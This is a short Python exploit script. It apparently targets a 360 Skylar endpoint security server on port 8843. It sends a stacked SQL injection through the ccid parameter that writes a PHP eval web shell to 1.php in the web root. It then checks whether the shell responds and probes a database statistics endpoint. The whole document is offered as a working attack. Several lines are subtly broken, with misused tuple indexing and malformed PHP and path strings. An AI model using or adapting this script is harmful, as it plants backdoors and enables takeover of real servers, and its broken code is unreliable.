# coding:utf-8

import requests

address=''
payloads=(
    ''':8843/api/dp/rptsvcsyncpoint?ccid=1';create table O(TEXT);insert into O(T) values('<>php @eval($_POST[1];?>)');copy O(T) to 'C"\Program Files(x86)\360\skylar6\www\1.php';drop table O;--''',
    ':8843/api/dbstat/gettablessize'
)
def checkShell():
    code =requests.get(address + ':8843/1.php').status_code
    return  code

if "http" not in address:
    address="http"+address
else:
    address=address

result =requests.get(address+payloads.index(0))
if checkShell()==200:
    print address+":8843/1.php"

result2=requests.get(address+payloads.index(1))

if result2.status_code==200:
    print address+payloads.index(1)




